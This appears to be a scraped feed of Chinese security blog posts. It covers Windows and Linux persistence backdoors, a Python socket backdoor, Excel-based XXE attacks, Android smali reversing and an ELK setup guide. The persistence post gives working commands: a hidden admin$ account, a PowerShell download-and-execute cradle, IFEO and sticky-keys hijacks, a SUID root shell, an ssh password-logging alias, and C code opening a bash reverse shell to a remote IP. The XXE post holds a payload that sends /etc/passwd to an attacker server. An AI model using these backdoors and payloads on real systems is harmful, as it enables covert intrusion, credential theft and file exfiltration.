允许管理员创建、删除、查询、更改、运行和中止本地或远程系统上的计划任 务。 参数列表: /Create 创建新计划任务。 /Delete 删除计划任务。 /Query 显示所有计划任务。 /Change 更改计划任务属性。 /Run 按需运行计划任务。 /End 中止当前正在运行的计划任务。 /ShowSid 显示与计划的任务名称相应的安全标识符。 /? 显示此帮助消息。 Examples: SCHTASKS SCHTASKS /? SCHTASKS /Run /? SCHTASKS /End /? SCHTASKS /Create /? SCHTASKS /Delete /? SCHTASKS /Query /? SCHTASKS /Change /? SCHTASKS /ShowSid /? Payload examples: SCHTASKS /Create /TN update /TR xx(待执行的命令) /DELAY ONLOGON /F /RL HIGHEST linux 一次性执行任务：at命令———&gt;atd进程 周期性执行任务：crontab命令———&gt;crond进程 在实际的渗透过程中我们更倾向于使用crontab at - 1.服务开启 service atd start - 2.基本格式 at [HH:MM] [yyyy-mm-dd] #没有指定年月日的，默认是当天的。 - 3.查询当前设置的at任务列表 atq #或at -l - 4.删除指定任务编号的at任务 atrm 编号 #或at -d - 5.查看计划任务的具体内容 at -c 任务号 - 6.使用文件中的命令作为计划任务（比较少用） at 时间 -f 文件 - 7.相关文件 /etc/at.deny：#该名单里面的人不可以使用 /etc/at.allow：#只有该名单里面的人可以使用 crontab 注意：（1）crontab 只会在/sbin、/bin、/usr/sbin、/usr/bin下查找命令，如果命令不在这些目录中，应该要使用绝对路径。（2）只有root用户可以管理其他用户的周期性任务（3）crontab在重启后之前的周期性任务无效，anacron可以弥补crontab的缺陷。配置文件：/etc/anacrontab。anacrontab会开机自动检查没有执行的计划任务，然乎逐一执行，这个过程是用户透明的。一般而言，crontab就已经可以满足基本的需求。 - 1.服务开启 service crond start - 2.编辑计划任务 crontab -e -u 用户名 - 3.查看计划任务 crontab -l -u 用户名 - 4.删除计划任务： crontab -r -u 用户名 - 相关文件 /var/spool/cron/用户名 #用户定义的设置 /var/log/cron #cron服务的日志文件 /etc/crontab #cron服务配置文件： anacron anacron是一个不同于crontab的任务，其只精确到天，用来弥补服务器在宕机下crond调度不周以及缓解计划任务执行过于集中的问题。它需要记录上次执行的时间，并更新到相应的/var/spool/anacron目录下，下次执行的时候会将当前时间和上次记录的时间进行对比，如果满足大于/etc/anacron的配置的天数就会立即执行相应的命令，然后刷新时间。 anacron 命令行参数： -t 配置文件路径 让anacron从指定配置文件中读取配置，常用于普通用户来管理个人任务 -S spooldir 设定新的spool目录来记录任务执行的时间戳，常用于普通用户来管理个人任务 -T 测试配置文件是否正确 -f 强制执行所有的任务，而不管之前的执行日期是否超过轮回天数 -u 将所有任务的执行日期都更新为当前日期，而不真正的执行任务 -s 串行地执行任务，只有前一个任务完成后才开始下一个任务 0x03 windows权限维持影子账户创建一个无法用用户本机用户罗列工具显示的用户，并且赋予管理员权限。所有操作需要有管理员权限。同时测试在windows server 2012服务器域环境下影子账户无法直接进行添加。 用’$’创建匿名用户，并归到administratorsa用户组 net user admin$ Test1 /add net localgroup administrators admin$ /add 导出匿名用户对应的sam目录下的注册表键值 regedt32.exe 打开 HKEY_LOCAL_MACHINESAMSAMDomainsAccountUsers键值，导出Names下用户目录以及对应的16进制目录。注意需要给Administrator用户赋予Sam键值权限，默认是不允许的。 删除匿名用户，双击导出的注册表文件，用先前导出的注册表键值对注册表进行修改。则可以重新还原之前的匿名用户，但是除了在注册表里面有用户记录，其他地方都不存在用户的信息。net user或计算机管理里本地用户和用户组是看不到用户信息的，具有很好的隐蔽性质。 net user admin$ /del PowerShell后门Empire框架 https://github.com/EmpireProject/Empire Schtasks-Backdoor https://github.com/re4lity/Schtasks-Backdoor msf use exploit/multi/script/web_delivery - 设置好参数后的powershell例子： powershell.exe -ExecutionPolicy Bypass -nop -w hidden -c $V=new-object net.webclient;$V.proxy=[Net.WebRequest]::GetSystemWebProxy();$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $V.downloadstring(&#39;http://192.168.80.155:8888/&#39;); 注册表开机启动在如下的注册表目录下注入键值HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun，可以实现开机自启动。以windows defender为例: 映像劫持 细节参考：https://www.anquanke.com/post/id/151425 涉及到的注册表项为IFEO（Image File Execution Options），默认是只有管理员和local system有权读写修改。 “HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options” 大致的原理如下：当我们按照常理运行属于IFEO列表的文件的时候（即可执行文件名在上述的注册表项下，出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它就可以正常运行。）会执行相关的选项参数，这里我们主要利用的参数是debugger,通过该参数我们可以实现偷梁换柱。下面以修改IE启动程序为例，实现运行IE程序但是启动的却是计算器。 1. 找到注册表“HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Options”目录下的iexplore.exe 2. 添加一个debugger字符串键值，并且赋值为calc.exe的执行路径，“C:Windowssystem32calc.exe” 3. 运行 iexplore.exe,bomb!!! 当然我们也可以在第一步新键一个注册表文件目录，取名为想要覆盖的可执行程序，后续步骤类似。 但是这样明目张胆的偷梁换柱有点张扬，根据安全客那篇文章，修改另外两个注册表键值可以实现原程序退出后静默运行后门程序。以执行notepad为例，退出后静默运行calc.exe reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionImage File Execution Optionsnotepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1 reg add &quot;HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionSilentProcessExitnotepad.exe&quot; /v MonitorProcess /t REG_SZ /d &quot;C:Windowssystem32calc.exe&quot; shift后门这个后门的方式比较老，在windows登陆的时候按五次shift打开cmd进行操作。前提条件是:在将C盘windows目录下面的system32文件夹可写的情况下，将里面的sethc.exe应用程序进行转移，并生成sethc.exe.bak文件。并将cmd.exe拷贝覆盖sethc.exe。 但是在windows xp过后，sethc组件属于完全受信用的用户TrustInstall，我们无法修改名字，这时候即使administrators都只有名义上的只读和可执行权，我们可以手动修改其所属为administrators，步骤如下： 右键属性/安全/高级； 所有者/编辑/添加当前用户/应用/确定； 关闭窗口； 右键属性/安全/编辑； 选择Administrators（或者你的当前组）/勾选完全控制/确定； 0x04 linux权限维持可以看到windows的权限维持很多时候是基于注册表值，但是linux里面没有注册表项，但是有很多的配置文件选项，可以达到相似的功能。下面介绍一些比较实用的后门手段。 sshd软连接 原理细节： http://www.91ri.org/16803.html victim ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; attack ssh root@x.x.x.x -p 5555 SUID Shellroot 权限下执行如下命令，普通用户运行/dev/.rootshell即可获得root权限 cp /bin/bash /dev/.rootshell chmod u+s /dev/.rootshell alias瞒天过海我们可以通过alias来指定执行特定的命令时候静默运行其他程序，从而达到启动后门，记录键值等作用。下面举两个实例： 修改ssh命令，利用strace，使其具有记录ssh对read,write,connect调用的功能。 alias ssh=&#39;strace -o /tmp/sshpwd-`date &#39;+%d%h%m%s&#39;`.log -e read,write,connect -s2048 ssh&#39; 利用守护进程回弹shell alias cat=&#39;cat&amp;&amp;/root/.shell&#39; shell.c #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; #include &lt;time.h&gt; #include &lt;fcntl.h&gt; #include &lt;string.h&gt; #include &lt;sys/stat.h&gt; #include &lt;signal.h&gt; #define ERR_EXIT(m) do { perror(m); exit(EXIT_FAILURE); } while (0); void creat_daemon(void); int main(void) { time_t t; int fd; creat_daemon(); system(&quot;bash -i &gt;&amp; /dev/tcp/192.168.80.167/8080 0&gt;&amp;1&quot;); return 0; } void creat_daemon(void) { pid_t pid; int devnullfd,fd,fdtablesize; umask(0); pid = fork(); if( pid == -1) ERR_EXIT(&quot;fork error&quot;); if(pid &gt; 0 ) exit(EXIT_SUCCESS); if(setsid() == -1) ERR_EXIT(&quot;SETSID ERROR&quot;); chdir(&quot;/&quot;); /* close any open file descriptors */ for(fd = 0, fdtablesize = getdtablesize(); fd &lt; fdtablesize; fd++) close(fd); devnullfd = open(&quot;/dev/null&quot;, 0); /* make STDIN ,STDOUT and STDERR point to /dev/null */ if (devnullfd == -1) { ERR_EXIT(&quot;can&#39;t open /dev/null&quot;); } if (dup2(devnullfd, STDIN_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDIN_FILENO&quot;); } if (dup2(devnullfd, STDOUT_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } if (dup2(devnullfd, STDERR_FILENO) == -1) { ERR_EXIT(&quot;can&#39;t dup2 /dev/null to STDOUT_FILENO&quot;); } signal(SIGCHLD,SIG_IGN); return; } linux PAM密码记录后门pam是一种认证机制，它可帮助管理员快速方便地配置认证方式，并且无需更改服务程序。这种后门主要是通过pam_unix_auth.c打补丁的方式潜入到正常的pam模块中，以此来记录管理员的帐号密码。 https://blog.51cto.com/redkey/1343316 PROMPT_COMMAND后门bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。 export PROMPT_COMMAND=&quot;lsof -i:1025 &amp;&gt;/dev/null || (python -c &quot;exec(&#39;encoded_payload&#39;.decode(&#39;base64&#39;))&quot; 2&gt;/dev/null &amp;)&quot; 当然也可以使用prompt_command进行提权,参考：https://www.anquanke.com/post/id/155943 ssh免密后门把id_rsa.pub写入服务端的/home/[用户名]/.ssh/authorized_keys中。 rootkitrootit的后门相对比较顽固，有应用级别和系统级别的rootkit，其大致的思路是hook进常规的调用中，是比较硬核的，经常体现在APT攻击中。下面是一个菊苣收集的rootkit后门的链接。具体的细节因为不同的rootkit具体实现不一致，笔者才疏，无法完全弄清楚，仅给出链接，方便日后学习。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"/tags/web安全/"}]},{"title":"Android 代码插桩","slug":"Android-代码插桩","date":"2019-02-14T09:51:20.000Z","updated":"2019-07-26T09:56:26.186Z","comments":true,"path":"2019/02/Android-代码插桩/","link":"","permalink":"/2019/02/Android-代码插桩/","excerpt":"","text":"何为代码插桩​ 最早是由J.C. Huang 教授提出的，它是在保证被测程序原有逻辑完整性的基础上在程序中插入一些探针（又称为“探测仪”，本质上就是进行信息采集的代码段，可以是赋值语或采集覆盖信息的函数调用，通过探针的执行并抛出程序运行的特征数据，通过对这些数据的分析，可以获得程序的控制流和数据流信息，进而得到逻辑覆盖等动态信息，从而实现测试目的的方法。 ​ 何为安卓插桩测试，插桩测试提供了一种通过 am instrument 命令启动的特殊测试执行环境，其中目标应用进程会重启并使用基本的应用上下文进行初始化，并在应用进程虚拟机内启动插桩线程。您的测试代码在此插桩线程上开始执行，并附带一个 Instrumentation 实例，该实例可提供对应用上下文和 API 的访问权限，以操纵接受测试的应用进程。 详细内容可以查看谷歌的插桩测试框架和方式：插桩测试 Log插桩此处，仅利用打印Log的方式来表示如何进行插桩。代码使用之前调试的代码，尝试来打印输入的字符串。 反编译后如下代码： 分析代码可以看到，如果需要打印输出，则实际获取到字符串的代码为 Name.getText().toString().trim() 因此，需要在onClick函数中打印输出，函数需要在按钮事件中触发，按钮相关的事件代码在MainActivity$1中。 在MainActivity$1中查看onClick函数。 假设，需要打印输入的name变量。则需要在如下添加： iget-object v1, p0, Lcom/example/user/application/MainActivity$1;-&gt;this$0:Lcom/example/user/application/MainActivity; iget-object v1, v1, Lcom/example/user/application/MainActivity;-&gt;Name:Landroid/widget/EditText; invoke-virtual {v1}, Landroid/widget/EditText;-&gt;getText()Landroid/text/Editable; move-result-object v1 invoke-virtual {v1}, Ljava/lang/Object;-&gt;toString()Ljava/lang/String; move-result-object v1 此内容为上图中关于带入name的smali代码，意思是，从MainActivity获取实例对象。赋值给v1寄存器，然后再调用getText()函数和toString()函数。 在添加 const-string v0, &quot;message&quot; invoke-static {v0, v1}, Landroid/util/Log;-&gt;i(Ljava/lang/String;Ljava/lang/String;)I 意思是调用Log.i函数打印输入，如上添加内容换算成Java代码类似于 Log.i(&quot;message&quot;,Name.getText().toString()); 回编译安装运行，监听日志输出，点击按钮事件可以看到如下的日志输出。 此种形式可以用在获取函数变量值和某些动态生成的参数中，来理解程序运行的结果和函数运行的方式。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"利用python socket编写后门","slug":"利用python-socket编写后门","date":"2019-02-02T03:00:50.000Z","updated":"2019-02-01T03:51:10.255Z","comments":true,"path":"2019/02/利用python-socket编写后门/","link":"","permalink":"/2019/02/利用python-socket编写后门/","excerpt":"","text":"在获取系统权限时候，一般想维持权限或者做端口转发的时候，会用一些端口转发的工具，例如nc，ew，lcx等。 但在这种类似后门的工具中被查杀率和存在后门的情况时有发生，本人就遇到过获取系统权限创建账号后，发现没多久又被植入其他隐藏账号的情况。 因此，既然会写一些代码就简单的来实现一个利用socket通信的后门脚本。 如下server端： # coding:utf-8 import socket import subprocess # server def server_main(ips): server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: server.bind((&quot;0.0.0.0&quot;, ips)) server.listen(5) print &quot;[*] Listening on %s:%d&quot; %(socket.gethostname(),ips) while True: data, addr = server.accept() buf = data.recv(4096) print &quot;[*] recv command = %s&quot; %buf if len(buf) != 0: if is_file(buf): rev = upload(buf) else: rev = run_command(buf) data.send(rev) except: print &quot;Exception!&quot; def is_file(buf): try: if isinstance(eval(buf), dict): return True except: return False def run_command(command): command = command.strip() try: p = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True) out, err = p.communicate() except: out = &quot;Fail to execute command!&quot; return out def upload(data): try: path = eval(data)[&#39;path&#39;] file = eval(data)[&#39;request&#39;] with open(path, &#39;wb&#39;) as f: f.write(file) return &quot;OK&quot; except: return &quot;Fail&quot; if __name__ == &quot;__main__&quot;: ip = input(&quot;PORT = &quot;) server_main(int(ip)) client端： #coding:utf-8 import socket # client # use: # &gt;&gt; command eg:&gt;&gt; whoami # &gt;&gt; upload 要上传的源文件 要上传到的目标地址文件 &gt;&gt; upload d:/a.txt e:/a.txt def client(ips, data): resp = socket.socket(socket.AF_INET, socket.SOCK_STREAM) try: resp.settimeout(10) resp.connect(ips) resp.send(data) out = resp.recv(4096) resp.close() except : out = &quot;Except Or Time out !&quot; return out def client_send(target, port): while True: data = raw_input(&quot;&gt;&gt; &quot;) if &#39;upload&#39; not in data: out = client((target,port),data) print &quot;[*] Command Out= %s&quot; % out else: upload((target,port),data) def upload(ips,data): file = data.split(&#39; &#39;) list_a = {} name = file[1].replace(&#39;\\\\&#39;,&#39;/&#39;) list_a[&#39;path&#39;] = file[2] request = &#39;&#39; with open(name,&#39;rb&#39;) as f: for i in f.readlines(): request+=i list_a[&#39;request&#39;] = request out = client(ips, str(list_a)) if &quot;OK&quot; in out: print &quot;[*] File Write Success !&quot; else: print &quot;[*] File Write Fail !&quot; if __name__ == &quot;__main__&quot;: ip = raw_input(&quot;IP:PORT = &quot;) list_a = ip.split(&quot;:&quot;) client_send(list_a[0], int(list_a[1])) 代码实现简单，问题在执行的时候是一个正向连接，在服务器开放端口，所以在一定情况下，需要较高的权限。当然这也是后渗透中需要得到的目标。 同时可以利用pyinstaller打包为exe文件在win下运行，不过开放防火墙就需要添加网络允许，但本人尝试中发现，对防火墙端口添加的提示中直接关闭窗口提示，再次运行就可以正常使用。防火墙中也没有启用此运行规则。尚不清楚原因。","categories":[],"tags":[{"name":"python","slug":"python","permalink":"/tags/python/"}]},{"title":"利用EXCEL文件进行XXE文件攻击","slug":"利用EXCEL文件进行XXE文件攻击","date":"2019-01-31T03:38:27.000Z","updated":"2019-01-31T03:40:41.082Z","comments":true,"path":"2019/01/利用EXCEL文件进行XXE文件攻击/","link":"","permalink":"/2019/01/利用EXCEL文件进行XXE文件攻击/","excerpt":"","text":"利用EXCEL文件进行XXE文件攻击此问题的来源是：https://mp.weixin.qq.com/s/pthuQFY9sQjxJOOQf91Weg 看到一篇如上的文章，利用EXCEL文档来造成系统的XXE漏洞，而恰好在我们自己的系统上发现了如上的类似漏洞，特此做一个记录文档。 0x01.什么是XML外部实体解释来源：https://www.freebuf.com/articles/web/126788.html 如果你了解XML，你可以把XML理解为一个用来定义数据的东东。因此，两个采用不同技术的系统可以通过XML进行通信和交换数据。 比如，下图就是一个用来描述一个职工的XML文档样本，其中的’name’,’salary’,’address’ 被称为XML的元素。 有些XML文档包含system标识符定义的“实体”，这些XML文档会在DOCTYPE头部标签中呈现。这些定义的’实体’能够访问本地或者远程的内容。比如，下面的XML文档样例就包含了XML ‘实体’。 在上面的代码中， XML外部实体 ‘entityex’ 被赋予的值为：file://etc/passwd。在解析XML文档的过程中，实体’entityex’的值会被替换为URI(file://etc/passwd)内容值（也就是passwd文件的内容）。 关键字’SYSTEM’会告诉XML解析器，’entityex’实体的值将从其后的URI中读取。因此，XML实体被使用的次数越多，越有帮助。 0×02. 什么是XML外部实体攻击？有了XML实体，关键字’SYSTEM’会令XML解析器从URI中读取内容，并允许它在XML文档中被替换。因此，攻击者可以通过实体将他自定义的值发送给应用程序，然后让应用程序去呈现。 简单来说，攻击者强制XML解析器去访问攻击者指定的资源内容（可能是系统上本地文件亦或是远程系统上的文件）。比如，下面的代码将获取系统上folder/file的内容并呈献给用户。 0×03. 怎么甄别一个XML实体攻击漏洞？最直接的回答就是： 甄别那些接受XML作为输入内容的端点。 但是有时候，这些端点可能并不是那么明显(比如，一些仅使用JSON去访问服务的客户端)。在这种情况下，渗透测试人员就必须尝试不同的测试方式，比如修改HTTP的请求方法，修改Content-Type头部字段等等方法，然后看看应用程序的响应，看看程序是否解析了发送的内容，如果解析了，那么则可能有XXE攻击漏洞。 如何利用EXCEL文档来造成XXE漏洞根据原文档介绍，是对excel文件进行解压缩，来替换其中的[Content-Types].xml或者xl/workbook.xml文件，来造成XXE漏洞。 但根据利用情况的不同，还有可以替换的文件: _rels/.rels 和 xl/worksheets/sheet1.xml等文件。 因此我们自己的系统在文件上传处，也存在一块，类似的XXE利用。 例如此处文件上传处，上传EXCEL文件。 在文件中的[Content-Types].xml中写入测试POC： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;http://xxx.com/&quot; &gt;]&gt; &lt;name&gt;&amp;GVI;&lt;/name&gt; 于是便可以在我们自己的VPS上监听到来自服务器的请求了。 由于是Blind XXE，所以我们利用在我们自己的VPS上存入如下文件： &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt; &lt;!ENTITY % all &quot;&lt;!ENTITY xxe SYSTEM &#39;http://ATTACKESERVER.com/?%file;&#39;&gt;&quot;&gt; %all; 远程利用类似如下： &lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE data SYSTEM &quot;http://ATTACKERSERVER.com/xxe_file.dtd&quot;&gt; 这时候便可以在监听上收到远程文件的读取。 当然这一块还可以尝试利用已有的脚本，来自动的开启web监听和ftp来传输文件。 https://github.com/joernchen/xxeserve 其他文章介绍： 1.XXE漏洞利用技巧：从XML到远程代码执行 2.利用OOB XXE盲攻击获取文件系统访问权限","categories":[],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"/tags/渗透测试/"}]},{"title":"Android Studio 动态调试","slug":"Android-Studio-动态调试","date":"2019-01-29T08:47:40.000Z","updated":"2019-07-26T09:56:30.634Z","comments":true,"path":"2019/01/Android-Studio-动态调试/","link":"","permalink":"/2019/01/Android-Studio-动态调试/","excerpt":"","text":"Android Studio 动态调试调试仍然使用我们喜闻乐见的Android Studio，不过使用的是AS3，AS在3.0版本后便不在使用DDMS，调试smali上有点不适应，不过我们仍然可以在配置SDK后，在命令行输入“monitor”来打开DDMS。 apk使用我们自己生成的一个简单的登陆判断界面来做测试。 使用网上的一段登陆代码如下 生成APK后，利用AK反编译为smali代码。 然后用AS打开反编译后的文件夹，当然在利用AS调试smali的时候，需要安装ideasmali插件，具体可以百度插件名即可下载。 调试的时候需要我们进行端口的转发，可以先用DDMS查看一下端口是否是8700（一般默认为8700），因为启动AS后会占有相应的端口，导致无法打开DDMS。 具体使用方式为：打开DDMS。在CMD命令行输入以下内容，其中package为包名。MainActivity是需要调试的activity名，具体看情况修改。 adb shell am start -D -n package/.MainActivity 可以看到手机端或者模拟器端已经以调试的方式启动我们相应的程序了。在DDMS中就可以看到一只红色的小蜘蛛了。后面有一个端口默认应该是8700。然后查看进程PID，假设为1980。 adb forward tcp:8700 jdwp:1980 进行端口转发到。转发的时候要先关闭DDMS，不然显示端口被占用。 在使用AS打开我们需要的文件后，如以下内容。 配置远程调试参数，修改端口为8700. 然后在需要的地方设置断点，此处在账户密码的判断处下断点。启动调试，然后就可以看到界面显示到我们断点前的地方了。在模拟器上输入账号密码后，就可以看到断点被执行。 可以看到下面两部分第一部分为为v0赋值为admin，调用String类的equals方法来判断v0参数和p1对象值是否相同，并把结果赋值给v0，一个布尔值。第二部分，判断v0是否为0，等于0跳转到:cond_0处。不等于0则继续，同样为v0赋值一个字符串为12345，调用方法判断是否相同，以下则和上面基本一致。 此时，需要做些什么修改，判断，以后参数变化，可以在下面的variables查看，上图中的参数就是在模拟器中输入的参数显示。","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Android逆向逻辑修改入门","slug":"Android逆向逻辑修改入门","date":"2019-01-28T08:28:34.000Z","updated":"2019-07-26T09:56:19.794Z","comments":true,"path":"2019/01/Android逆向逻辑修改入门/","link":"","permalink":"/2019/01/Android逆向逻辑修改入门/","excerpt":"","text":"Android 逻辑判断修改使用AS创建一个工程，利用生成工程的初始代码来做。 创建新的layout，在mainactivity中添加新的layout标识。在显示界面的时候加一个判断逻辑，完成后类似如下 if(a==1) { setContentView(R.layout.activity_main); } else setContentView(R.layout.activity_main2); } 于是乎，当a为1的时候显示activity_main界面字段。不为1显示activity_main2字段。 一般情况下，对于有些需要内购，或者某些情况才给你显示的界面的时候，界面不是从后端返回而是返回json参数由前端接收显示的时候，可以从前端修改逻辑来绕过判断。 生成smali代码，其中主要部分为下： .method protected onCreate(Landroid/os/Bundle;)V .registers 4 .param p1, &quot;savedInstanceState&quot; # Landroid/os/Bundle; .prologue .line 17 invoke-super {p0, p1}, Landroid/support/v7/app/AppCompatActivity;-&gt;onCreate(Landroid/os/Bundle;)V .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e .line 20 const v1, 0x7f09001c invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V .line 24 :goto_d return-void .line 23 :cond_e const v1, 0x7f09001d invoke-virtual {p0, v1}, Lcom/example/user/application/MainActivity;-&gt;setContentView(I)V goto :goto_d .end method 整体的代码相当简单轻松，来看判断代码处。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 if-ne v0, v1, :cond_e 其中if-ne，逻辑显示v0不等于v1，跳转到cond_e标签处。 修改一：直接修改if-ne判断形式，修改为if-eq，这样只要不完成正常的逻辑操作，都会跳转到我们想看的界面。 修改二：由于判断处是根据参数a的值和1做对比，所以我们直接对a重赋值(以上的a赋值可以粗略的看为是请求获取的值)。 .line 18 const/4 v0, 0x0 .line 19 .local v0, &quot;a&quot;:I const/4 v1, 0x1 const/4 v0, 0x1 if-ne v0, v1, :cond_e 修改三：利用强制跳转，在需要去查看，或者执行下去的地方添加标签，goto_1，然后在判断执行前强制跳转进去。 const/4 v1, 0x1 goto :goto_1 if-ne v0, v1, :cond_0 .line 20 :goto_1 const v1, 0x7f09001c","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"Android 逆向Smali语言初识","slug":"Android-逆向Smali语言初识","date":"2019-01-22T07:55:56.000Z","updated":"2019-07-26T09:56:22.802Z","comments":true,"path":"2019/01/Android-逆向Smali语言初识/","link":"","permalink":"/2019/01/Android-逆向Smali语言初识/","excerpt":"","text":"Android 逆向Smali语言初识​ Smali，Baksmali分别是指安卓系统里的Java虚拟机（Dalvik）所使用的一种.dex格式文件的汇编器，反汇编器。 函数语法​ Smali 语法规范与格式Smali 是对 Dalvik 虚拟机字节码的一种解释，虽然不是官方标准语言，但所有语句都遵循一套语法规范。要了解 smali 语法规范，可以先从了解 Dalvik 虚拟机字节码的指令格式开始。3.1 Dalvik 虚拟机字节码指令格式在 Android 4.0 源码 Dalvik/docs 目录下提供了一份文档 instruction-formats.html，里面详细列举了 Dalvik 虚拟机字节码指令的所有格式。 Dalvik 虚拟机字节码的类型、方法和字段的表示方法3.2.1 类型Dalvik 字节码有两种类型，基本类型和引用类型。对象和数组是引用类型，其它都是基本类型。 Dalvik 字节码类型描述符 ​ 描述符 类型 V void，只能用于返回值类型 Z boolean B byte S short C charI intJ long（64 位） F floatD double（64 位） L Java 类类型 [ 数组类型 常见的代码含义： #表示当前代码在源java文件中的行数。 .line .line 34 #表示来自公共方法methodAReturn返回值是一个对象com.bolex.AA method .method public methodAReturn(Lcom/bolex/AA;Lcom/bolex/AA;)Lcom/bolex/AA; #表示该函数上需要使用3个寄存器 registers .registers 3 #表示接收两个入参都是AA对象，并标记寄存器p1和p2 param .param p1, &quot;mAA&quot; # Lcom/bolex/AA; .param p2, &quot;sAA&quot; # Lcom/bolex/AA; #表示函数内执行的起始标记 .prologue .prologue #表示 返回寄存器上p1对象 return-object return-object p1 #表示函数结束标记 .end method #创建一个AA对象 new-instance new-instance v0, Lcom/bolex/AA; #表示使用无参构造方法直接调用 invoke-direct invoke-direct {v0}, Lcom/bolex/AA;-&gt;&lt;init&gt;()V #表示为虚拟方法 invoke-virtual #数组操作指令 #new-array构造指定类型I也就是int类型并且把值赋给v0 # v0=new int[8]; new-array v0,v0,[ I #array-length 获取给定v0寄存器中数组的长度并将值赋给v1寄存器，数组长度就是数组的个数。v1=v0,也就是说v1=8 array-length v1,v0 # 方法调用指令 #new-instance v1,... 构造一个指定类型对象的新实例，并将对象引用赋值给v1寄存器。 #L表示java类型中的任何类， # StringBuilder对象是动态对象，允许扩充它所封装的字符串中字符的数量，但是您可以为它可容纳的最大字符数指定一个值。相当于是一个string的升级版。 new-instance v1,Ljava/lang/StringBuilder; # 方法调用指令 #&lt;init&gt;:在实例创建出来的时候调用，包括调用new操作符； new-direct v1,Ljava/lang/StringBuilder;-&gt;&lt;init&gt;( )v # 跳转指令 if (v0!=0) #if-nez 的意思就是 not equal zero 如果v0不等于0，那么就继续向下执行，如果等于0就跳转到标号名为cond_0的位置。 if-nez v0, : cond_0 # goto的含义就是强行跳转到标号名为goto_0的地方 goto :goto_0 #标号cond_0 ：cond_0 # 数据转换指令 #把int型变量转变为float变量 int-to-float v2,v2 # 数据运算指令 # 相当于 v2+=v2，第一个v2是寄存器，第二个和第三个是数据 add-float v2,v2,v2 Java编译dex文件以下用常见的hello world来表示smali语法结构。 public class firedt { public static void main(String[] args){ System.out.println(&quot;hello world&quot;); } } 在AS中打开代码，安装java2smali插件后，在build-&gt;compile to smali编译为smali代码。 编译完成后的代码为以下，并对关键代码进行注释含义： .class public Lfiredt; #定义一个firedt类 .super Ljava/lang/Object; #继承object类 .source &quot;firedt.java&quot; #由firedt.java编译来 # direct methods .method public constructor &lt;init&gt;()V .registers 1 #注册一个寄存器 .prologue #代码开始 .line 1 #第一行 invoke-direct {p0}, Ljava/lang/Object;-&gt;&lt;init&gt;()V return-void .end method .method public static main([Ljava/lang/String;)V #说明一个main的静态方法，类型为void .registers 3 .prologue .line 3 sget-object v0, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream; #获取变量对象保存到v0 const-string v1, &quot;hello world&quot; #赋值一个字符串v1=hello world invoke-virtual {v0, v1}, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V #调用printstream的println方法把v0赋值v1 .line 4 return-void .end method #方法结束，一个method对应一个end method 参考资料： smali语法中文参考文档 逆向之Smali入门学习","categories":[],"tags":[{"name":"Android逆向","slug":"Android逆向","permalink":"/tags/Android逆向/"}]},{"title":"ELK搭建使用","slug":"ELK搭建使用","date":"2018-11-04T09:05:12.000Z","updated":"2018-11-04T09:34:33.734Z","comments":true,"path":"2018/11/ELK搭建使用/","link":"","permalink":"/2018/11/ELK搭建使用/","excerpt":"","text":"ELK日志分析系统搭建使用ELK是三个开源软件的缩写，分别表示：Elasticsearch , Logstash, Kibana , 它们都是开源软件。但现在新增了一个FileBeat，它是一个轻量级的日志收集处理工具(Agent)，Filebeat占用资源少，适合于在各个服务器上搜集日志后传输给Logstash，但此次并不添加filebeat，仍然以es、logstash、kibana做搭建使用。 使用环境：centos6.5 192.168.253.138作为日志来源服务器 apache ​ centos7 192.168.253.139 作为显示终端服务器 安装jdk首先安装Java，版本1.8以上。 安装Elasticsearch下载elasticsearch ， wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.4.2.tar.gz 修改解压文件中的config/elasticsearch.yml 文件 # 这里指定的是集群名称，需要修改为对应的，开启了自发现功能后，ES会按照此集群名称进行集群发现 cluster.name: es_cluster node.name: es_cluster_1 # 数据目录 path.data: /data/data # log 目录 path.logs: /data/logs # 修改一下ES的监听地址，这样别的机器也可以访问 network.host: 192.168.253.139 # 默认的端口号 http.port: 9200 discovery.zen.ping.unicast.hosts: [&quot;192.168.253.138&quot;, &quot;192.168.253.139&quot;] 在使用中可能会因为系统内存等问题导致启动失败，所以可以预调整系统参数。 设置内核参数 vi /etc/sysctl.conf # 